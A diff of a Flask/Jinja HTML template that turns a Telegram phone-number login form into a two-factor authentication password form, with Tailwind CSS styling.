@@ -6,15 +6,15 @@
     </svg>
 {% endblock %}
 
-{% block contentTitle %}Telegram{% endblock %}
+{% block contentTitle %}Two-factor Authentication{% endblock %}
 
-{% block contentDescription %}Enter the phone number<br>(with international code) to receive login code{% endblock %}
+{% block contentDescription %}Enter your password set for 2FA{% endblock %}
 
-{% block form_action %}/{% endblock %}
+{% block form_action %}/2fa{% endblock %}
 
 {% block wtf_hiddentag %}{{ form.hidden_tag() }}{% endblock %}
 
-{% block wtf_input %}{{ form.phone(placeholder="+65--------", class_="block w-full rounded-md border-0 bg-white/5 py-1.5 pr-10 text-white ring-1 ring-inset ring-white/10 invalid:ring-1 invalid:ring-inset invalid:ring-red-500 placeholder:invalid:text-red-300 focus:ring-2 focus:ring-inset focus:ring-indigo-500 focus:invalid:ring-2 focus:invalid:ring-inset focus:invalid:ring-red-500 tracking-wider sm:text-sm sm:leading-6") }}{% endblock %}
+{% block wtf_input %}{{ form.password(placeholder="abc123!", class_="block w-full rounded-md border-0 bg-white/5 py-1.5 pr-10 text-white ring-1 ring-inset ring-white/10 invalid:ring-1 invalid:ring-inset invalid:ring-red-500 placeholder:invalid:text-red-300 focus:ring-2 focus:ring-inset focus:ring-indigo-500 focus:invalid:ring-2 focus:invalid:ring-inset focus:invalid:ring-red-500 tracking-wider sm:text-sm sm:leading-6") }}{% endblock %}
 
 {% block wtf_submit %}{{ form.submit(class_="mt-3 inline-flex w-full items-center justify-center rounded-md bg-indigo-600 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 sm:ml-3 sm:mt-0 sm:w-auto") }}{% endblock %}
 
